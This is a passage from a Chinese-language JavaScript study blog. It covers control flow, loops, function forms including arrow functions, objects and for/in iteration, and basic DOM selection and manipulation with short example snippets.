class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (d)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:x=<span class="string">&quot;今天是星期六&quot;</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:x=<span class="string">&quot;今天是星期日&quot;</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">    <span class="attr">default</span>:</span><br><span class="line">    x=<span class="string">&quot;期待周末&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code> - 注意不要漏掉break，不然程序继续执行下一个case，直到遇到break或switch语句结束。</code></pre></li><li><p><strong>循环语句</strong></p><p>当明确循环次数的时候使用for，不确定的时候使用while(true)</p><p><strong>1）while循环和do/while循环</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//先判断再执行</span></span><br><span class="line"><span class="keyword">while</span> (i&lt;<span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">    x=x + <span class="string">&quot;The number is &quot;</span> + i + <span class="string">&quot;&lt;br&gt;&quot;</span></span><br><span class="line">    i++</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//先执行一次再判断</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    x=x + <span class="string">&quot;The number is &quot;</span> + i + <span class="string">&quot;&lt;br&gt;&quot;</span></span><br><span class="line">    i++</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (i&lt;<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p><strong>2）for循环</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// for循环</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;cars.<span class="property">length</span>;i++)</span><br><span class="line">&#123; </span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(cars[i] + <span class="string">&quot;&lt;br&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// for/in语句遍历对象的属性</span></span><br><span class="line"><span class="keyword">let</span> person = &#123;<span class="attr">fname</span>:<span class="string">&quot;Bill&quot;</span>,<span class="attr">lname</span>:<span class="string">&quot;Gates&quot;</span>,<span class="attr">age</span>:<span class="number">56</span>&#125;; </span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> person)  <span class="comment">// x 为属性名</span></span><br><span class="line">&#123;</span><br><span class="line">    txt = txt + person[x]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3）打破循环</strong></p><ul><li><p><strong>break语句</strong>：直接跳出循环，执行循环之后的代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (i==<span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//if (i==3) break</span></span><br><span class="line">    x=x + <span class="string">&quot;The number is &quot;</span> + i + <span class="string">&quot;&lt;br&gt;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>continue语句</strong>：中断当前循环中的迭代，继续循环下一个迭代</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;=<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (i==<span class="number">3</span>) <span class="keyword">continue</span>;</span><br><span class="line">    x=x + <span class="string">&quot;The number is &quot;</span> + i + <span class="string">&quot;&lt;br&gt;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h2 id="函数"><a class="markdownIt-Anchor" href="#函数"></a> 函数</h2><h3 id="函数声明"><a class="markdownIt-Anchor" href="#函数声明"></a> 函数声明</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="comment">// 注意：这样仅仅是声明，只有调用了函数才会执行</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params">let1,let2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        code</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 调用</span></span><br><span class="line"><span class="title function_">myFunction</span>(let1,let2)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="具名函数和匿名函数"><a class="markdownIt-Anchor" href="#具名函数和匿名函数"></a> 具名函数和匿名函数</h3><ol><li><p><strong>具名函数</strong>：<code>function fn() &#123;&#125;</code></p><p>1）定义：具名函数的调用可以写到任何位置，即可以先调用再声明</p><p>2）调用：fn()</p></li><li><p><strong>匿名函数</strong>：<code>function() &#123;&#125;</code></p><p>1）定义：没有名字的函数。它们通常用于一些不需要复用的场景，或者是传递给其他函数作为参数时。匿名函数<strong>无法调用</strong>，可以直接定义并立即执行，也可以赋值给一个变量，或者作为回调函数使用。</p><p>2）使用方式：</p><ul><li><p>函数表达式：先声明再调用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">let</span> fn = <span class="keyword">function</span> (<span class="params">let1,let2</span>)</span><br><span class="line">&#123;</span><br><span class="line">code</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用</span></span><br><span class="line"><span class="title function_">fn</span>(x,y)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>立即执行函数：不需要调用，直接执行。</p><p><u>多个立即执行函数之间必须要用分号隔开</u></p><p><mark>这里的两个括号：第一个括号就是将函数声明看作函数，后面的括号直接调用函数</mark></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    (<span class="keyword">function</span> (<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        code</span><br><span class="line">    &#125;)();</span><br><span class="line">    <span class="comment">// 注意多了两个括号</span></span><br><span class="line">    (<span class="keyword">function</span> (<span class="params">x,y</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(x + y)</span><br><span class="line">    &#125;)(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ul><blockquote><p><mark>这样来看的话，立即执行函数好像和直接写顺序代码执行，不封装为函数没有什么区别？</mark></p><p>其实还是有作用的：封装了函数等于构建了一个新的作用域，在这个作用域里面使用的变量和函数外是分离的，可以重复相互不影响。达到了防止变量污染的作用。</p></blockquote></li></ol><h3 id="箭头函数"><a class="markdownIt-Anchor" href="#箭头函数"></a> 箭头函数</h3><ol><li><p><strong>定义</strong></p><p>箭头函数是 JS <strong>一种简化函数定义的写法</strong>，箭头函数比传统的函数表达式更简洁，省去了 <code>function</code> 关键字，特别是在只有一个参数的情况下，连括号都可以省略。</p></li><li><p><strong>特点</strong></p><p>不绑定自己的 <code>this</code>。传统函数中，会创建自己的this，例如：作为构造函数调用时，<code>this</code>指向新创建的实例对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> person = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;Alice&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="property">name</span>); <span class="comment">// 输出：Alice</span></span><br></pre></td></tr></table></figure><p>箭头函数与传统函数不同，它不创建自己的 <code>this</code>，而是继承自外部（即定义时的上下文）的 <code>this</code>值。这意味着箭头函数中的 <code>this</code> 在定义时已经确定，而不是调用时。</p><p>例如，下面调用this的时候，箭头函数 <code>arrow</code> 中的 <code>this</code> 继承自 <code>method</code> 函数的上下文，所以 <code>this</code> 指向 <code>obj</code> ，而不是箭头函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    <span class="attr">value</span>: <span class="number">42</span>,</span><br><span class="line">    <span class="attr">method</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="title function_">arrow</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">value</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="title function_">arrow</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">obj.<span class="title function_">method</span>(); <span class="comment">// 输出：42</span></span><br></pre></td></tr></table></figure><p>因此，这种行为使得箭头函数在某些场景下非常有用，特别是在需要保持<code>this</code>指向的情况下，例如回调函数、事件处理器等。</p></li><li><p><strong>语法</strong></p><ul><li><p>无参数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">sayHello</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">sayHello</span>(); <span class="comment">// 输出：Hello, World!</span></span><br></pre></td></tr></table></figure></li><li><p>单参数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">square</span> = x =&gt; x * <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">square</span>(<span class="number">2</span>)); <span class="comment">// 输出：4</span></span><br></pre></td></tr></table></figure></li><li><p>多参数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">add</span> = (<span class="params">a, b</span>) =&gt; a + b;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">add</span>(<span class="number">2</span>, <span class="number">3</span>)); <span class="comment">// 输出：5</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>可以<mark>将匿名函数和箭头函数一起使用</mark></strong></p><p>例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 传统匿名函数</span></span><br><span class="line">(<span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a + <span class="number">100</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 移除“function”，并将箭头放置于参数和函数体起始大括号之间</span></span><br><span class="line"><span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> a + <span class="number">100</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 移除代表函数体的大括号和“return”——返回值是隐含的</span></span><br><span class="line"><span class="function">(<span class="params">a</span>) =&gt;</span> a + <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 移除参数周围的括号</span></span><br><span class="line"><span class="function"><span class="params">a</span> =&gt;</span> a + <span class="number">100</span>;</span><br></pre></td></tr></table></figure></li></ol><h2 id="对象"><a class="markdownIt-Anchor" href="#对象"></a> 对象</h2><ol><li><p><strong>对象的定义</strong></p><p>对象是一种数据类型，是一种无序的数据的集合，可以用于详细地描述某个事物。</p><ul><li>对象中由<strong>属性和方法</strong>组成</li></ul><p>例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;</span><br><span class="line">    <span class="comment">// 属性</span></span><br><span class="line">    <span class="attr">firstName</span>:<span class="string">&quot;John&quot;</span>,</span><br><span class="line">    <span class="attr">lastName</span>:<span class="string">&quot;Doe&quot;</span>,</span><br><span class="line">    <span class="attr">age</span>:<span class="number">50</span>,</span><br><span class="line">    <span class="comment">// 方法</span></span><br><span class="line">    fullName : <span class="keyword">function</span>(<span class="params"></span>) </span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="string">&quot; &quot;</span> + <span class="variable language_">this</span>.<span class="property">lastName</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p><strong>对象的使用</strong></p><p>访问对象中的属性值： <code>对象名.属性 </code> 或 <code>对象名[&quot;属性&quot;]</code>（属性名中包含<code>-</code>的时候只能用后者）</p><p>访问方法也是一样的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 增（直接赋值一个新的属性即可）</span></span><br><span class="line">person.<span class="property">hobby</span> = <span class="string">&quot;basketball&quot;</span></span><br><span class="line"><span class="comment">// 删</span></span><br><span class="line"><span class="keyword">delete</span> person.<span class="property">hobby</span></span><br><span class="line"><span class="comment">// 改</span></span><br><span class="line">person.<span class="property">firstName</span> = <span class="string">&quot;isoda&quot;</span></span><br><span class="line"><span class="comment">// 查</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="property">firstName</span>)</span><br><span class="line">name = person.<span class="title function_">fullName</span>()</span><br></pre></td></tr></table></figure></li><li><p><strong>对象的遍历</strong></p><p>使用for/in语句遍历对象的属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;<span class="attr">fname</span>:<span class="string">&quot;Bill&quot;</span>,<span class="attr">lname</span>:<span class="string">&quot;Gates&quot;</span>,<span class="attr">age</span>:<span class="number">56</span>&#125;; </span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> person)  <span class="comment">// key 为属性名，为字符串</span></span><br><span class="line">&#123;</span><br><span class="line">    txt = txt + person[key]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意：</p><p>这里<strong>只能用 person[key] 来访问对象</strong>，因为key为字符串，为’fname’,'lname’的形式</p><p>所以不能使用person.key，显示出来就是person.‘fname’，这种形式明显是错误的，会得到undefined。而 person[‘fname’]，这种访问方法才是正确的。</p></blockquote></li></ol><h1 id="js-dom"><a class="markdownIt-Anchor" href="#js-dom"></a> JS DOM</h1><h2 id="dom简介"><a class="markdownIt-Anchor" href="#dom简介"></a> DOM简介</h2><ol><li><p><strong>概念</strong></p><p>DOM（文档对象模型），是浏览器提供的一套专门用来<strong>操作网页内容</strong>的功能（API），通过DOM，JavaScript 可以创建动态的HTML，实现用户的交互：</p><ul><li><p>改变页面中的所有 HTML 元素</p></li><li><p>改变页面中的所有 HTML 属性</p></li><li><p>改变页面中的所有 CSS 样式</p></li><li><p>对页面中的所有事件做出反应</p></li></ul></li><li><p><strong>DOM树</strong></p><p>将HTML文档以树状结构直观的表现出来，即DOM树。可以<strong>直观体现标签和标签之间的关系</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240716143932776.png" alt="image-20240716143932776" /></p></li><li><p><strong>DOM对象</strong></p><p>从DOM树上获取到的所有html标签都是<u>JS对象</u>，即DOM对象</p><ul><li>所有的标签属性都可以在这个对象上面找到</li><li><strong>修改这个对象的属性会自动映射到标签身上</strong></li><li>从dom树来看，最大的dom对象就是document对象，document对象下的属性和方法都是用来访问和操作网页内容的，如 <code>document.write（）</code> 用来写入网页内容</li></ul></li></ol><h2 id="获取dom元素"><a class="markdownIt-Anchor" href="#获取dom元素"></a> 获取DOM元素</h2><ol><li><p><strong>通过CSS选择器来获取</strong></p><ul><li><p><strong>querySelector</strong>：匹配符合的第一个元素，返回对应的HTML元素对象</p></li><li><p><strong>querySelectorAll</strong>：返回符合的HTML元素对象数组</p><ul><li><p>注意，返回的是一个伪数组，有长度有索引号，但是没有pop和push等方法</p><p>通过p[0]等来访问</p></li><li><p>如果只有一个元素，返回的也是仅有一个元素的伪数组</p></li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="keyword">class</span> = <span class="string">&#x27;box&#x27;</span>&gt;<span class="number">123</span>&lt;/div&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span> = <span class="string">&#x27;box&#x27;</span>&gt;</span>abc<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>导航栏<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 直接获取标签 </span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> box = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;div&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 根据class</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> box = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.box&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(box)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 根据id</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> nav = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#nav&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(nav)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">nav.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;red&#x27;</span><span class="comment">//可以对其直接修改样式属性</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 获取ul下的第一个li，和CSS的选择方法一样</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> li = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;ul li:first-child&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(li)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p><strong>其他获取DOM元素的方式</strong></p><p>以下三种是比较老的写法，目前已经逐渐不再使用了</p><ul><li>通过 id 找到 HTML 元素</li><li>通过标签名找到 HTML 元素</li><li>通过类名找到 HTML 元素</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;nav&#x27;</span>)</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;div&#x27;</span>)</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;w&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ol><h2 id="操作html内容"><a class="markdownIt-Anchor" href="#操作html内容"></a> 操作HTML内容</h2><ol><li><p><strong>innerText</strong></p><p>修改文本内容，仅<u>显示纯文本，不解析标签</u></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.box&#x27;</span>).<span class="property">innerText</span> = <span class="string">&#x27;我是一个盒子&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>innerHTML</strong></p><p>修改文本内容，可以解析标签</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.box&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;strong&gt;我是一个盒子&lt;/strong&gt;&#x27;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="操作元素属性"><a class="markdownIt-Anchor" href="#操作元素属性"></a> 操作元素属性</h2><ol><li><p><strong>操作元素基本属性</strong></p><p>如src、href、title等</p><ul><li><p>语法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对象.属性 = 值</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;img&#x27;</span>).<span class="property">src</span> = <span class="string">&#x27;./images/a.webp&#x27;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>操作元素样式属性CSS</strong></p><p><strong>1）通过style属性操作</strong></p><p>语法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对象.style.样式属性 = 值</span></span><br><span class="line">&lt;div <span class="keyword">class</span> = <span class="string">&quot;box&quot;</span>&gt; &lt;/div&gt;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.box&#x27;</span>).<span class="property">style</span>.<span class="property">width</span> = <span class="string">&#x27;200px&#x27;</span></span><br><span class="line">box.<span class="property">style</span>.<span class="property">backgroundColor</span> = <span class="string">&#x27;hotpink&#x27;</span></span><br></pre></td></tr></table></figure><ul><li><p>属性中存在的数字单位不要忘记添加，如 <code>px</code></p></li><li><p>如果属性中含有 <code>-</code> 连接符，可以去掉 <code>-</code> 然后将后面的首字母大写</p><p>如 <code>background-color</code> 可以改成  <code>backgroundColor</code></p></li></ul><p><strong>2）通过className操作</strong></p><p>当需要修改的样式比较多的时候，逐一修改style属性比较繁琐，可以设置一个新的class，然后将需要修改的标签的class修改为新创建的class</p><p>语法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 元素.className = 新的class名称</span></span><br><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Javascript学习<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="selector-class">.class1</span>&#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">width</span>: <span class="number">200px</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">height</span>: <span class="number">200px</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">background-color</span>: <span class="number">#fff</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="selector-class">.class2</span>&#123;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">width</span>: <span class="number">300px</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">height</span>: <span class="number">300px</span>;</span></span></span><br><span class="line"><span 